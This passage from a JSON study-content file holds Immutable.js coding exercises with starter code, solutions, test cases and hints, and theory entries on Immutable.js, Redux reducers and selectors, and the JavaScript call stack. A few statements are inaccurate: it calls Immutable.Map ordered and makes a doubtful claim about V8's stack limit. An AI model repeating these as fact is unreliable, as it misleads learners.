            "Constructor: Initialize with an empty array `[]` (should result in empty set). Initialize with `['a', 'b', 'a']` (should result in `Set(['a', 'b'])`).",
            "Add new tag: `addTag('c')` to `['a', 'b']` should result in `Set(['a', 'b', 'c'])` (new instance).",
            "Add existing tag: `addTag('a')` to `['a', 'b']` should result in the *same instance* of `Set(['a', 'b'])` (due to `Immutable.Set` optimization, though `UserTagManager` wraps a new instance for consistency).",
            "Remove existing tag: `removeTag('b')` from `['a', 'b', 'c']` should result in `Set(['a', 'c'])` (new instance).",
            "Remove non-existent tag: `removeTag('d')` from `['a', 'b']` should return the same instance as original.",
            "Check existence: `hasTag('a')` should be `true`, `hasTag('d')` should be `false`.",
            "Get tags: `getTags()` should convert the `Set` to a plain JS array.",
            "Common tags: `getCommonTags` for two managers with overlapping tags (e.g., `['a', 'b']` and `['b', 'c']` -> `['b']`).",
            "Common tags (no overlap): `getCommonTags` for two managers with no common tags (should return `[]`).",
            "Immutability: Verify that the original `UserTagManager` instance (and its internal `Set`) remains unchanged after `addTag` or `removeTag` operations."
          ],
          "hints": [
            "The `Immutable.Set` constructor automatically handles unique values when initialized from an array.",
            "The `Set.add()` method returns a new `Set` if the value is new, or the *same instance* if the value already exists (this is a key optimization for Immutable.js).",
            "`Set.delete()` removes a value and returns a new `Set`.",
            "`Set.has()` is for checking existence.",
            "For `getCommonTags`, `Immutable.Set.prototype.intersect()` is the perfect method.",
            "Always remember to return a `new UserTagManager()` instance after any modification, wrapping the new `Immutable.Set` returned by Immutable.js methods.",
            "Use `toJS()` or `toArray()` to convert the `Immutable.Set` back to a plain JavaScript array for public methods."
          ],
          "tags": [
            "Immutable.js",
            "Set",
            "Data Management",
            "Unique Values",
            "Immutability",
            "Set Operations"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "theory_immutable_set"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Tagging_systems",
            "Filtering",
            "Set_theory"
          ]
        },
        {
          "id": "task_immutable_orderedset_1",
          "title": "Build a Recent History Manager with OrderedSet",
          "description": "\nCreate a `RecentHistoryManager` class that keeps track of recently viewed items (e.g., product IDs, article titles) as unique entries, while preserving the order in which they were viewed. The manager should have a maximum capacity.\n\n**Requirements:**\n1.  **Constructor:** Initialize with an optional `initialItems` array and a `capacity` (e.g., 5). The initial items should respect uniqueness and order.\n2.  **`viewItem(item)`:** Add an item to the history. If the item already exists, it should be moved to the *most recent* position (the end of the order). If the history reaches `capacity`, the *oldest* item (at the beginning) should be removed.\n3.  **`getHistory()`:** Return the unique items in viewing order as a plain JavaScript array.\n4.  **`hasItem(item)`:** Check if an item is currently in the history.\n5.  **`clearHistory()`:** Reset the history to an empty state.\n\nUse `Immutable.OrderedSet` for the underlying data structure.\n",
          "difficulty": "hard",
          "startingCode": "import { OrderedSet } from 'immutable';\n\nclass RecentHistoryManager<T> {\n  private history: OrderedSet<T>;\n  private readonly capacity: number;\n\n  constructor(capacity: number, initialItems: T[] = []) {\n    this.capacity = capacity;\n    // TODO: Initialize history as OrderedSet, respect capacity and order\n    this.history = OrderedSet();\n  }\n\n  viewItem(item: T): RecentHistoryManager<T> {\n    // TODO: Add/move item to end, handle capacity\n    return this;\n  }\n\n  getHistory(): T[] {\n    // TODO: Return history as plain array\n    return [];\n  }\n\n  hasItem(item: T): boolean {\n    // TODO: Check if item exists\n    return false;\n  }\n\n  clearHistory(): RecentHistoryManager<T> {\n    // TODO: Reset history\n    return this;\n  }\n}\n\n// Example Usage:\nconst manager = new RecentHistoryManager<string>(3);\nconsole.log('Initial History:', manager.getHistory()); // []\n\nconst m1 = manager.viewItem('Product A');\nconsole.log('After A:', m1.getHistory()); // ['Product A']\n\nconst m2 = m1.viewItem('Product B');\nconsole.log('After B:', m2.getHistory()); // ['Product A', 'Product B']\n\nconst m3 = m2.viewItem('Product C');\nconsole.log('After C:', m3.getHistory()); // ['Product A', 'Product B', 'Product C']\n\nconst m4 = m3.viewItem('Product D'); // Capacity reached, A should be removed\nconsole.log('After D (A removed):', m4.getHistory()); // ['Product B', 'Product C', 'Product D']\n\nconst m5 = m4.viewItem('Product B'); // B viewed again, should move to end\nconsole.log('After B again:', m5.getHistory()); // ['Product C', 'Product D', 'Product B']\n\nconsole.log('Has Product C?', m5.hasItem('Product C')); // true\nconsole.log('Has Product A?', m5.hasItem('Product A')); // false\n\nconst m6 = m5.clearHistory();\nconsole.log('After Clear:', m6.getHistory()); // []\n\nconsole.log('Original manager history (unchanged):', manager.getHistory()); // []\n",
          "solutionCode": "import { OrderedSet } from 'immutable';\n\nclass RecentHistoryManager<T> {\n  private history: OrderedSet<T>;\n  private readonly capacity: number;\n\n  constructor(capacity: number, initialItems: T[] = []) {\n    this.capacity = capacity;\n    // Initialize history, taking first 'capacity' unique items from initialItems\n    this.history = OrderedSet(initialItems.slice(0, capacity));\n  }\n\n  viewItem(item: T): RecentHistoryManager<T> {\n    let newHistory = this.history;\n\n    // If item exists, remove it first to re-add to end\n    if (newHistory.has(item)) {\n      newHistory = newHistory.delete(item);\n    }\n\n    // Add the item to the end (most recent)\n    newHistory = newHistory.add(item);\n\n    // If capacity is exceeded, remove the oldest item (first in the OrderedSet)\n    if (newHistory.size > this.capacity) {\n      newHistory = newHistory.shift(); // shift removes the first element\n    }\n\n    return new RecentHistoryManager(this.capacity, newHistory.toJS());\n  }\n\n  getHistory(): T[] {\n    return this.history.toJS();\n  }\n\n  hasItem(item: T): boolean {\n    return this.history.has(item);\n  }\n\n  clearHistory(): RecentHistoryManager<T> {\n    return new RecentHistoryManager(this.capacity); // Re-initialize with empty history\n  }\n}\n\n// Example Usage:\nconst manager = new RecentHistoryManager<string>(3);\nconsole.log('Initial History:', manager.getHistory()); // []\n\nconst m1 = manager.viewItem('Product A');\nconsole.log('After A:', m1.getHistory()); // ['Product A']\n\nconst m2 = m1.viewItem('Product B');\nconsole.log('After B:', m2.getHistory()); // ['Product A', 'Product B']\n\nconst m3 = m2.viewItem('Product C');\nconsole.log('After C:', m3.getHistory()); // ['Product A', 'Product B', 'Product C']\n\nconst m4 = m3.viewItem('Product D'); // Capacity reached, A should be removed\nconsole.log('After D (A removed):', m4.getHistory()); // ['Product B', 'Product C', 'Product D']\n\nconst m5 = m4.viewItem('Product B'); // B viewed again, should move to end\nconsole.log('After B again:', m5.getHistory()); // ['Product C', 'Product D', 'Product B']\n\nconsole.log('Has Product C?', m5.hasItem('Product C')); // true\nconsole.log('Has Product A?', m5.hasItem('Product A')); // false\n\nconst m6 = m5.clearHistory();\nconsole.log('After Clear:', m6.getHistory()); // []\n\nconsole.log('Original manager history (unchanged):', manager.getHistory()); // []\n\n// More edge cases\nconst managerWithInitial = new RecentHistoryManager<number>(2, [10, 20, 10, 30]); // Unique and slice to capacity\nconsole.log('Manager with initial values:', managerWithInitial.getHistory()); // [10, 20] (order of initial elements retained, then truncated)\n\nconst m7 = managerWithInitial.viewItem(40);\nconsole.log('After 40:', m7.getHistory()); // [20, 40] (10 removed)\n\nconst m8 = m7.viewItem(20); // 20 viewed again\nconsole.log('After 20 again:', m8.getHistory()); // [40, 20]\n\nconst managerEmptyCapacity = new RecentHistoryManager<string>(0);\nconsole.log('Empty capacity manager:', managerEmptyCapacity.getHistory()); // []\nconst m9 = managerEmptyCapacity.viewItem('X');\nconsole.log('Add to empty capacity:', m9.getHistory()); // [] (item added then immediately removed)\n",
          "testCases": [
            "Initial state: `RecentHistoryManager(3)` should start empty. `RecentHistoryManager(2, ['a', 'b', 'a', 'c'])` should initialize with `OrderedSet(['a', 'b'])`.",
            "Add new item: `viewItem('X')` should add 'X' to the end.",
            "Add existing item: `viewItem('A')` when 'A' is already present should move 'A' to the most recent position (end).",
            "Capacity management: Add items until capacity is reached. Add one more, verify the oldest item is removed.",
            "Capacity management with existing item: Add items until capacity is reached. View an item that is currently in the middle of the history; verify it moves to the end and the oldest *other* item is removed if capacity is now exceeded (e.g., for capacity 3, history `[A, B, C]`, view `B` -> `[A, C, B]`).",
            "Check existence: `hasItem('X')` should work correctly.",
            "Clear history: `clearHistory()` should return an empty history.",
            "Immutability: All operations should return new `RecentHistoryManager` instances, leaving the originals unchanged.",
            "Edge case: `capacity = 0`. `viewItem` should always result in an empty history.",
            "Edge case: `viewItem` with multiple identical items in `initialItems` (should result in unique set, preserving first encountered order up to capacity)."
          ],
          "hints": [
            "To move an existing item to the end, first `delete()` it, then `add()` it. `OrderedSet` naturally adds to the end.",
            "To enforce capacity, after adding/reordering, check `history.size`. If it exceeds `capacity`, use `history.shift()` to remove the oldest item (which is at the beginning of an `OrderedSet`).",
            "Remember to wrap the new `Immutable.OrderedSet` result in a new `RecentHistoryManager` instance for every modifying operation to maintain immutability.",
            "The constructor for `OrderedSet` can take an iterable (like an array). It will automatically handle uniqueness and initial order."
          ],
          "tags": [
            "Immutable.js",
            "OrderedSet",
            "Data Structures",
            "History Management",
            "LRU",
            "Immutability"
          ],
          "timeEstimate": 90,
          "prerequisites": [
            "theory_immutable_orderedset",
            "theory_immutable_list"
          ],
          "complexity": 9,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "Caching",
            "Least_recently_used",
            "UX_patterns"
          ]
        }
      ]
    }
  },
  {
    "id": "72e8450d-5365-4a81-aad4-572b40b7e390",
    "startLine": 10800,
    "endLine": 10899,
    "processedDate": "2025-06-17T11:54:39.228Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_immutable_js_collections",
          "title": "Immutable.js: Core Concepts and Data Structures",
          "content": "Immutable.js is a library that provides immutable data structures for JavaScript. Immutability means that once a data structure is created, it cannot be changed. Any operation that would 'modify' the structure actually returns a new instance of the structure with the changes, leaving the original intact. This approach helps in building applications with more predictable state, easier debugging, and optimized performance through structural sharing and referential equality checks.\n\n## Key Concepts\n*   **Immutability**: Data structures cannot be altered after creation. Operations like `set`, `update`, `push` return new instances.\n*   **Persistence**: Previous versions of the data structure remain valid and accessible.\n*   **Structural Sharing**: When a 'modified' version of an immutable data structure is created, only the parts that have changed are re-created. Unchanged parts are shared between the old and new versions, saving memory and improving performance.\n*   **Referential Equality**: Because operations return new instances, you can easily check if a data structure has changed by comparing references (e.g., `oldState === newState`). This is crucial for performance optimizations in UI frameworks like React.\n\n## Immutable Data Structures\n\n### `Immutable.Map`\n`Immutable.Map` is an immutable, ordered collection of key-value pairs, similar to a JavaScript `Object` or a `Map`. It's a fundamental immutable collection.\n\n### `Immutable.List`\n`Immutable.List` is an immutable, ordered indexed collection, similar to a JavaScript `Array`.\n\n### `Immutable.Set`\n`Immutable.Set` is an immutable collection of unique values, similar to a JavaScript `Set`.\n\n### `Immutable.Record`\n`Immutable.Record` provides a way to define immutable objects with a predefined shape and default values. It's useful for creating type-safe and predictable data models.\n\n### `Immutable.fromJS`\n`Immutable.fromJS` is a utility function that deeply converts plain JavaScript objects and arrays into Immutable.js `Map`s and `List`s respectively. This is essential when integrating Immutable.js with existing JavaScript data.\n\n## Common Operations\n*   **`get(key)`**: Retrieves a value associated with a key.\n*   **`set(key, value)`**: Returns a new `Map` with the value at the specified key updated or added.\n*   **`update(key, updaterFn)`**: Returns a new `Map` with the value at `key` updated by the `updaterFn`. The `updaterFn` receives the current value and should return the new value.\n*   **`push(value)`**: Returns a new `List` with `value` appended.\n*   **`filter(predicateFn)`**: Returns a new collection containing only elements for which the `predicateFn` returns `true`.\n*   **`filterNot(predicateFn)`**: Returns a new collection containing only elements for which the `predicateFn` returns `false`.\n*   **`merge(otherMap)`**: Returns a new `Map` with the values from `otherMap` merged into the original `Map`. Conflicts are resolved by the `otherMap`'s values taking precedence.\n*   **`union(collection)`**: Returns a new `Set` containing all unique values from the original `Set` and the provided `collection`.",
          "examples": [
            {
              "id": "example_immutable_map_1",
              "title": "Creating and Updating Immutable.Map",
              "code": "import { Map } from 'immutable';\n\n// Creating an immutable map\nconst map1 = Map({ a: 1, b: 2, c: 3 });\nconsole.log('Map 1:', map1.toJS()); // { a: 1, b: 2, c: 3 }\n\n// Updating 'b' (returns a new map, map1 remains unchanged)\nconst map2 = map1.set('b', 50);\n\nconsole.log('Map 1 (after update):', map1.get('b')); // 2\nconsole.log('Map 2 (new map):', map2.get('b')); // 50\n\n// Using update method\nconst map3 = map2.update('c', value => value * 2);\nconsole.log('Map 3 (updated c):', map3.get('c')); // 100",
              "explanation": "This example demonstrates how `Immutable.Map` instances are created and how `set` and `update` methods operate. Notice that `map1` remains unchanged after `set('b', 50)` is called, proving the immutability principle. `update` provides a functional way to modify a value based on its current state.",
              "language": "typescript"
            },
            {
              "id": "example_immutable_record_1",
              "title": "Using Immutable.Record for Structured Data",
              "code": "import { Record } from 'immutable';\n\nconst DataRecord = Record({\n  value: 5,\n  unit: 'count'\n});\n\nconst TestRecord = Record({\n  text: '',\n  data: new DataRecord() // Nested Record with default\n});\n\nconst testInstance1 = new TestRecord();\nconsole.log(testInstance1.get('data').get('value')); // 5 (the default value)\nconsole.log(testInstance1.get('data').get('unit')); // 'count'\n\n// Create a new instance with overridden values\nconst testInstance2 = testInstance1.set('text', 'Hello').setIn(['data', 'value'], 10);\nconsole.log(testInstance2.get('text')); // 'Hello'\nconsole.log(testInstance2.get('data').get('value')); // 10\nconsole.log(testInstance1.get('text')); // '' (original remains unchanged)\nconsole.log(testInstance1.get('data').get('value')); // 5",
              "explanation": "`Immutable.Record` allows defining a blueprint for immutable objects, complete with default values and nested structures. This improves code readability and maintainability by ensuring a consistent data shape. Accessing values is done via `get` or property access if configured. Updates return new `Record` instances.",
              "language": "typescript"
            },
            {
              "id": "example_immutable_fromjs_1",
              "title": "Converting JavaScript Objects to Immutable Structures",
              "code": "import { fromJS, isImmutable } from 'immutable';\n\n// A plain JavaScript object\nconst jsState = {\n  list: [1, 2, { id: 1 }],\n  isAddUserModalShowed: false,\n  tmpUser: null,\n  settings: {\n    theme: 'dark',\n    notifications: true\n  }\n};\n\n// Deep conversion to Immutable Maps and Lists\nconst immutableState = fromJS(jsState);\n\nconsole.log(isImmutable(immutableState)); // true\nconsole.log(isImmutable(immutableState.get('list'))); // true\nconsole.log(immutableState.getIn(['list', 2, 'id'])); // 1\nconsole.log(immutableState.getIn(['settings', 'theme'])); // 'dark'\n\n// Demonstrating updates\nconst newState = immutableState.set('isAddUserModalShowed', true);\nconsole.log(newState.get('isAddUserModalShowed')); // true\nconsole.log(immutableState.get('isAddUserModalShowed')); // false (original unchanged)",
              "explanation": "`fromJS` is crucial for initializing Immutable.js structures from existing JavaScript data. It performs a deep conversion, ensuring all nested objects become `Map`s and arrays become `List`s. This makes it easy to integrate Immutable.js into applications that might initially receive or generate plain JavaScript data.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_immutable_js_benefits_open_1",
            "question_immutable_js_map_update_mcq_1",
            "question_immutable_js_record_mcq_1",
            "question_immutable_js_fromjs_code_1",
            "question_immutable_js_filter_flashcard_1"
          ],
          "relatedTasks": [
            "task_immutable_state_management"
          ],
          "tags": [
            "Immutable.js",
            "Data Structures",
            "Immutability",
            "Functional Programming",
            "State Management"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "javascript_objects",
            "javascript_arrays",
            "functional_programming_basics"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "redux_with_immutablejs",
            "react_performance_optimization"
          ]
        },
        {
          "id": "theory_redux_with_immutable_js",
          "title": "Integrating Immutable.js with Redux",
          "content": "Redux relies heavily on the concept of immutability for state updates. Reducers in Redux must be pure functions, meaning they should not mutate their arguments (the state) and should produce the same output for the same input. When working with large or deeply nested state objects in plain JavaScript, ensuring immutability can become verbose and error-prone (e.g., using spread operators extensively for deep copies).\n\nImmutable.js simplifies state management in Redux by providing native immutable data structures. This ensures that state updates always return new objects, making it easier to follow Redux's immutability principle and leverage performance optimizations.\n\n## Reducer Implementation with Immutable.js\n\nWhen using Immutable.js, the initial state of the Redux store is typically an `Immutable.Map`.\n\n```typescript\nimport { Map, List } from 'immutable';\n\n// Initial state as an Immutable Map\nfunction reducer(state = Map(), action) {\n  switch (action.type) {\n    case 'ADD_PHONE':\n      // 'phones' is assumed to be an Immutable.List within the state Map\n      // update ensures that if 'phones' doesn't exist, it's initialized as an empty List\n      return state.update('phones', List(), phones => phones.push(action.phone));\n    case 'REMOVE_PHONE':\n      return state.update('phones', List(), phones => phones.filterNot(phone => phone === action.phone));\n    case 'SET_STATE':\n      // merge allows combining the current state with a new state object\n      // It handles both plain JS objects (if fromJS is used on action.state) or Immutable Map\n      return state.merge(action.state);\n    default:\n      return state;\n  }\n}\n```\n\n### Key aspects in a Reducer using Immutable.js:\n\n*   **Initial State**: The reducer function typically defines a default value for the `state` parameter, usually an empty `Immutable.Map()`. This ensures the state is always an immutable object from the start.\n    ```typescript\n    function reducer(state = Map(), action) {\n        // ...\n    }\n    ```\n*   **Action Handling**: Reducers process `action` objects, which typically have a `type` property. Based on the `action.type`, the state is updated.\n*   **Immutable Operations**: Instead of direct mutation, `Immutable.Map` methods like `set()`, `update()`, `merge()`, `delete()`, and `Immutable.List` methods like `push()`, `filterNot()` are used. Each of these methods returns a new Immutable.js object, preserving the original state.\n*   **Structural Sharing**: These operations efficiently create new state objects by sharing unchanged parts of the data structure, which is more performant than deep cloning plain JavaScript objects.\n*   **ES2015 Features**: Arrow functions (e.g., `phones => phones.push(action.phone)`) and default parameters (`state = Map()`) are commonly used for concise reducer logic.\n*   **Returning New State**: After each state update, the new immutable state object must be returned. This is how the Redux store recognizes that the state has changed and triggers updates for connected components.",
          "examples": [
            {
              "id": "example_redux_reducer_immutable_1",
              "title": "Detailed Immutable.js Reducer Example",
              "code": "import { Map, List } from 'immutable';\n\nconst initialState = Map({\n  user: null,\n  settings: Map({\n    darkMode: false,\n    notifications: true\n  }),\n  tasks: List([\n    Map({ id: 1, text: 'Learn Redux', completed: false }),\n    Map({ id: 2, text: 'Master Immutable.js', completed: true })\n  ])\n});\n\nfunction appReducer(state = initialState, action) {\n  switch (action.type) {\n    case 'SET_USER':\n      // Update a top-level property\n      return state.set('user', Map(action.payload.user));\n    case 'TOGGLE_DARK_MODE':\n      // Update a nested property using updateIn\n      return state.updateIn(['settings', 'darkMode'], mode => !mode);\n    case 'ADD_TASK':\n      // Add an item to an Immutable List\n      const newTask = Map({ id: action.payload.id, text: action.payload.text, completed: false });\n      return state.update('tasks', tasks => tasks.push(newTask));\n    case 'COMPLETE_TASK':\n      // Update an item within a List based on its ID\n      return state.update('tasks', tasks =>\n        tasks.map(task =>\n          task.get('id') === action.payload.id ? task.set('completed', true) : task\n        )\n      );\n    case 'RESET_STATE':\n      // Merge a completely new state (e.g., from server or local storage)\n      // Assumes action.payload.newState is an Immutable Map\n      return state.merge(action.payload.newState);\n    default:\n      return state;\n  }\n}\n\n// --- Usage Example ---\nlet currentState = initialState;\nconsole.log('Initial State:', currentState.toJS());\n\ncurrentState = appReducer(currentState, { type: 'SET_USER', payload: { user: { id: 'u1', name: 'Alice' } } });\nconsole.log('After SET_USER:', currentState.toJS());\n\ncurrentState = appReducer(currentState, { type: 'TOGGLE_DARK_MODE' });\nconsole.log('After TOGGLE_DARK_MODE:', currentState.toJS());\n\ncurrentState = appReducer(currentState, { type: 'ADD_TASK', payload: { id: 3, text: 'Build a Redux App' } });\nconsole.log('After ADD_TASK:', currentState.toJS());\n\ncurrentState = appReducer(currentState, { type: 'COMPLETE_TASK', payload: { id: 1 } });\nconsole.log('After COMPLETE_TASK:', currentState.toJS());",
              "explanation": "This example demonstrates a Redux reducer fully utilizing Immutable.js. It shows how to initialize state, handle various actions (`set`, `updateIn`, `update`, `push`, `map`, `merge`) for different data structures (top-level properties, nested objects, lists), all while adhering to the immutability principle. Each action type returns a new state object, ensuring the original state is never mutated.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_redux_immutable_benefits_open_1",
            "question_redux_immutable_reducer_mcq_1",
            "question_redux_immutable_update_code_1",
            "question_redux_immutable_initial_state_flashcard_1"
          ],
          "relatedTasks": [
            "task_redux_immutable_reducer"
          ],
          "tags": [
            "Redux",
            "Immutable.js",
            "State Management",
            "Reducers",
            "Immutability",
            "Frontend Architecture"
          ],
          "technology": "Redux",
          "prerequisites": [
            "redux_basics",
            "immutable_js_collections"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "large_scale_redux_apps",
            "performance_optimized_react_apps"
          ]
        },
        {
          "id": "theory_redux_selectors",
          "title": "Redux Selectors for State Access",
          "content": "In Redux, selectors are functions that take the entire Redux state as an argument and return a derived piece of data from that state. They serve as a crucial abstraction layer, encapsulating the logic for accessing and transforming state. Selectors promote reusability, testability, and can significantly improve performance when combined with memoization libraries like Reselect.\n\n## Why use Selectors?\n\n1.  **Encapsulation and Reusability**: Centralize state access logic. Instead of components directly digging into the state, they call a selector.\n2.  **Decoupling**: Components become decoupled from the exact structure of the Redux state. If the state shape changes, only the selector needs to be updated, not every component that uses that piece of state.\n3.  **Derived Data**: Selectors are perfect for computing derived data (e.g., filtered lists, aggregated sums) that depend on multiple parts of the state.\n4.  **Performance Optimization (Memoization)**: When a selector is memoized (e.g., using `reselect`'s `createSelector`), it only re-computes its result if its input arguments change. If the arguments are the same as the last call, it returns the cached result, preventing unnecessary re-renders in connected components.\n5.  **Testability**: Selectors are pure functions, making them easy to test in isolation.\n\n## Types of Selectors\n\n### Basic Selectors\nThese are simple functions that extract a direct slice of the state.\n\n```typescript\n// Basic selector: returns the entire todos slice of state\nconst getTodos = state => state.todos;\n\n// Basic selector: returns a specific property\nconst getIsLoading = state => state.ui.isLoading;\n```\n\n### Complex/Derived Selectors\nThese selectors combine multiple pieces of state or perform transformations on existing state data.\n\n```typescript\n// More complex selector that filters data\nconst getCompletedTodos = state => state.todos.filter(todo => todo.completed);\n\n// Selector combining data from different parts of the state\nconst getUserDisplayName = state => state.user.firstName + ' ' + state.user.lastName;\n```\n\nWhen working with Immutable.js, selectors typically receive an Immutable.js object as `state` and use Immutable.js methods (`get`, `getIn`, `filter`, `map`, `toJS`, etc.) to access and manipulate the data.",
          "examples": [
            {
              "id": "example_redux_selector_complex_1",
              "title": "Complex Selector with Immutable.js State",
              "code": "import { createSelector } from 'reselect';\nimport { Map, List } from 'immutable';\n\n// Assume Redux state is an Immutable.Map:\n// const state = Map({ \n//   todos: List([\n//     Map({ id: 1, text: 'Learn Redux', completed: false }),\n//     Map({ id: 2, text: 'Master Selectors', completed: true }),\n//     Map({ id: 3, text: 'Build App', completed: false })\n//   ]),\n//   filter: 'SHOW_ALL'\n// });\n\n// Input selectors (basic selectors)\nconst getTodosList = state => state.get('todos');\nconst getVisibilityFilter = state => state.get('filter');\n\n// A derived selector that filters todos based on the visibility filter\nconst getVisibleTodos = createSelector(\n  [getTodosList, getVisibilityFilter], // Input selectors\n  (todos, filter) => { // Selector function, receives results of input selectors\n    switch (filter) {\n      case 'SHOW_ALL':\n        return todos;\n      case 'SHOW_COMPLETED':\n        return todos.filter(todo => todo.get('completed'));\n      case 'SHOW_ACTIVE':\n        return todos.filter(todo => !todo.get('completed'));\n      default:\n        throw new Error('Unknown filter: ' + filter);\n    }\n  }\n);\n\n// --- Usage Example ---\nconst sampleState = Map({\n  todos: List([\n    Map({ id: 1, text: 'Buy groceries', completed: false }),\n    Map({ id: 2, text: 'Do laundry', completed: true }),\n    Map({ id: 3, text: 'Call mom', completed: false })\n  ]),\n  filter: 'SHOW_COMPLETED'\n});\n\nconst completedTodos = getVisibleTodos(sampleState);\nconsole.log('Completed Todos:', completedTodos.toJS()); // [{ id: 2, text: 'Do laundry', completed: true }]\n\nconst sampleState2 = sampleState.set('filter', 'SHOW_ALL');\nconst allTodos = getVisibleTodos(sampleState2);\nconsole.log('All Todos:', allTodos.toJS()); // All three todos",
              "explanation": "This example demonstrates a complex Redux selector using `reselect` to achieve memoization and `Immutable.js` for state management. `getTodosList` and `getVisibilityFilter` are input selectors. `getVisibleTodos` uses `createSelector` to combine their outputs and filter the `todos` list. The `createSelector` ensures that `getVisibleTodos` only re-runs its transformation logic if `todos` or `filter` actually change, preventing unnecessary re-computations and improving performance.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_redux_selector_purpose_mcq_1",
            "question_redux_selector_benefits_open_1",
            "question_redux_selector_memoization_flashcard_1",
            "question_redux_selector_derived_code_1"
          ],
          "relatedTasks": [
            "task_redux_selectors_implementation"
          ],
          "tags": [
            "Redux",
            "Selectors",
            "Reselect",
            "State Management",
            "Performance Optimization",
            "Immutability"
          ],
          "technology": "Redux",
          "prerequisites": [
            "redux_basics",
            "immutable_js_collections"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "large_scale_redux_apps",
            "react_performance_optimization"
          ]
        },
        {
          "id": "theory_javascript_engine_fundamentals",
          "title": "JavaScript Engine Fundamentals: V8, Memory & Call Stack",
          "content": "A JavaScript engine is a program that executes JavaScript code. The most widely known and used engine today is **V8**, developed by Google. V8 powers the Chrome browser, Node.js runtime, and Electron, among others. Understanding the core components of a JavaScript engine is crucial for writing efficient and non-blocking JavaScript applications.\n\n## V8 Engine Architecture (Simplified)\n\n<img src=\"https://www.google.com/url?sa=i&url=https%3A%2F%2Fmiro.medium.com%2Fv2%2Fresize%3Afit%3A1400%2F1%2A8M09t2uL1-XJb6P_jMv0Xg.jpeg&psig=AOvVaw0Y_jR_0L_q4X-4v4c_jMv0&ust=1708892864380000&source=images&cd=vfe&opi=89978449&ved=0CBMQjRxqFwoTCJDd-vS5tYMDFQAAAAAdAAAAABAI\" alt=\"V8 Engine Simplified Diagram\">\n*(Image for illustrative purposes, actual diagram not provided in markdown, placeholder used.)*\n\n### Core Components:\n\n1.  **Memory Heap**: This is the region of memory where objects, variables, and functions are stored during the execution of a program. When you declare a variable or create an object (e.g., `const obj = { a: 1 };`), the memory for that data is allocated in the heap. The heap is dynamic and unstructured, allowing for flexible memory allocation for objects whose size might not be known at compile time.\n\n2.  **Call Stack**: The Call Stack (often just referred to as \"the stack\") is a LIFO (Last-In, First-Out) data structure that keeps track of the execution context of a program. When a function is called, a new 'stack frame' (or 'execution context') is pushed onto the stack. This frame contains information about the function's arguments, local variables, and the return address. When a function finishes execution, its stack frame is popped off the stack. JavaScript is single-threaded, meaning it has only one call stack. This implies that only one function can be executing at any given time.\n    *   **Stack Overflow**: If the call stack exceeds its maximum capacity (e.g., due to infinitely recursive function calls without a base case), a 'Stack Overflow' error occurs. Chrome's V8 engine typically has a maximum stack depth, around 16,000 entries, which it clears upon overflow.\n\n## Parallel Code Execution and the Event Loop\n\n**The Blocking Problem**: Because JavaScript is single-threaded and has only one call stack, as long as there is a function executing on the call stack, the browser (or Node.js runtime) cannot perform other tasks. This means the UI becomes unresponsive, animations freeze, and network requests cannot be processed until the current task on the stack completes. This is known as the \"blocking\" problem.\n\n**The Solution (Event Loop - High-Level Overview)**: To overcome the blocking problem for I/O operations (like network requests, timers, DOM events), JavaScript environments (browsers, Node.js) implement a concurrency model based on the Event Loop, Callback Queue (or Task Queue), and Web APIs (or Node.js C++ APIs). While not explicitly detailed in the provided text, the mention of the blocking problem naturally leads to this crucial concept:\n*   **Web APIs / Node.js APIs**: These are environment-provided functionalities (e.g., `setTimeout`, `fetch`, DOM events) that can handle asynchronous operations outside the main JavaScript thread.\n*   **Callback Queue (Task Queue)**: When an asynchronous operation completes, its associated callback function is placed in a queue.\n*   **Event Loop**: Continuously monitors the Call Stack and the Callback Queue. If the Call Stack is empty, it takes the first callback from the Callback Queue and pushes it onto the Call Stack for execution.\n\nThis mechanism allows JavaScript to perform non-blocking asynchronous operations despite being single-threaded, ensuring a responsive user interface.\n\n```typescript\n// Example of Call Stack behavior\nfunction multiply(a, b) {\n  return a * b;\n}\n\nfunction square(n) {\n  return multiply(n, n);\n}\n\nfunction calculate() {\n  const result = square(5);\n  console.log(result);\n}\n\ncalculate();\n// Call Stack progression:\n// 1. calculate() is pushed\n// 2. square(5) is pushed\n// 3. multiply(5, 5) is pushed\n// 4. multiply returns, pops\n// 5. square returns, pops\n// 6. console.log(result) is pushed\n// 7. console.log returns, pops\n// 8. calculate returns, pops (stack is empty)\n```",
          "examples": [
            {
              "id": "example_js_engine_call_stack_1",
              "title": "Understanding the Call Stack",
              "code": "function greet(name) {\n  console.log(`Hello, ${name}!`);\n}\n\nfunction introduce() {\n  greet('Alice');\n}\n\nfunction start() {\n  introduce();\n}\n\nstart();\n\n/*\nCall Stack Visualization:\n\n1. `start()` is pushed\n   Stack: [start]\n\n2. `introduce()` is pushed (called by start)\n   Stack: [start, introduce]\n\n3. `greet('Alice')` is pushed (called by introduce)\n   Stack: [start, introduce, greet]\n\n4. `console.log(...)` is pushed (called by greet)\n   Stack: [start, introduce, greet, console.log]\n\n5. `console.log` finishes, popped\n   Stack: [start, introduce, greet]\n\n6. `greet` finishes, popped\n   Stack: [start, introduce]\n\n7. `introduce` finishes, popped\n   Stack: [start]\n\n8. `start` finishes, popped\n   Stack: [] (empty)\n*/",
              "explanation": "This example illustrates the Last-In, First-Out (LIFO) behavior of the Call Stack. Each function call adds a frame to the stack, and when a function completes, its frame is removed. This mechanism ensures that JavaScript knows where to return to after a function finishes execution.",
              "language": "typescript"
            },
            {
              "id": "example_js_engine_blocking_async_1",
              "title": "Illustrating Blocking vs. Non-Blocking (Conceptual)",
